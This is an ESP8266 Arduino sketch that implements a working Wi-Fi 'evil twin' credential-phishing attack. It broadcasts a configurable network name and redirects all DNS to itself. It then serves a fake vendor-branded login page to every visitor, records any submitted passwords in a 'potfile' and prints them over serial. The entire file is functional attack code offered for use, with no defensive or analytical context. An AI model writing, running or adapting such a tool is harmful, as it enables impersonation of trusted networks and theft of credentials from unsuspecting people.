#include "Arduino.h"

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <ESPAsyncWebServer.h>
const byte DNS_PORT = 53;
const byte STATUS_OK = 200;

IPAddress gateway(192,168,0,1);
IPAddress subnet(255,255,255,0);
AsyncWebServer web(80);

DNSServer dns;

void display_potfile();

String webpage;

void show_form(AsyncWebServerRequest *request) {
  request->send(200, "text/html", webpage);
}

void write_to_potfile(const char* s) {
  File potfile = LittleFS.open("potfile.txt", "a");
  if (!potfile) {
    Serial.println("error: failed to open potfile.txt for writing");
    return;
  }
  potfile.println(s);
  potfile.close();
}

void capture_post(AsyncWebServerRequest *request) {
  if (request->hasParam("password", true)) {
    const AsyncWebParameter *p = request->getParam("password", true);
    const char* password = p->value().c_str();
    Serial.printf("core::capture_post captured %s\n", password);
    write_to_potfile(password);
  }
  show_form(request);
}

void display_potfile() {
  File potfile = LittleFS.open("potfile.txt", "r");
  if (!potfile) {
    Serial.println("warning: failed to open potfile.txt for reading");
    return;
  }
  while (potfile.available()) {
    Serial.write(potfile.read());
  }
  potfile.close();
}

typedef struct Config {
  bool error;
  String essid;
  String vendor;
} Config;

Config load_config() {
  File config_file = LittleFS.open("config.ini", "r");
  if (!config_file) {
    Serial.println("fatal: failed to open config for reading");
    return Config { error: true };
  }

  String fragment;
  String essid;
  String vendor;
  bool key { true };
  int captured = 0;
  while(config_file.available()) {
    if (key) {
      fragment = config_file.readStringUntil('=');
      key = false;
      continue;
    }
    if (fragment == "essid") {
      captured++;
      essid = config_file.readStringUntil('\n');
    }
    if (fragment == "vendor") {
      captured++;
      vendor = config_file.readStringUntil('\n');
    }
    key = true;
  }
  if (captured == 2) return Config { error: false, essid: essid, vendor: vendor };
  return Config { error: true };
}

void setup() {
  Serial.begin(115200);
  Serial.println("\r");
  Serial.println("core::setup starting ap");
  
  if (!LittleFS.begin()){
    Serial.println("error: failed to mount LittleFS");
    return;
  }
  Serial.println("core::setup displaying passwords collected");
  display_potfile();

  Config config = load_config();
  if (config.error) {
    Serial.println("fatal: configuration file is invalid");
    return;
  }
  WiFi.softAPConfig(gateway, gateway, subnet);
  WiFi.softAP(config.essid);

  File web_file = LittleFS.open("index.html", "r");
  if (!web_file) {
    Serial.println("fatal: failed to open web page for reading");
    return;
  }

  webpage = web_file.readString();
  web_file.close();
  webpage.replace("VENDOR", config.vendor);

  // pretend to be the gateway and every other site in existence
  dns.start(DNS_PORT, "*", gateway);

  web.on("/", HTTP_GET, show_form);
  web.on("/", HTTP_POST, capture_post);
  web.onNotFound(show_form);
  web.begin();
}

void loop() {
  dns.processNextRequest();
}
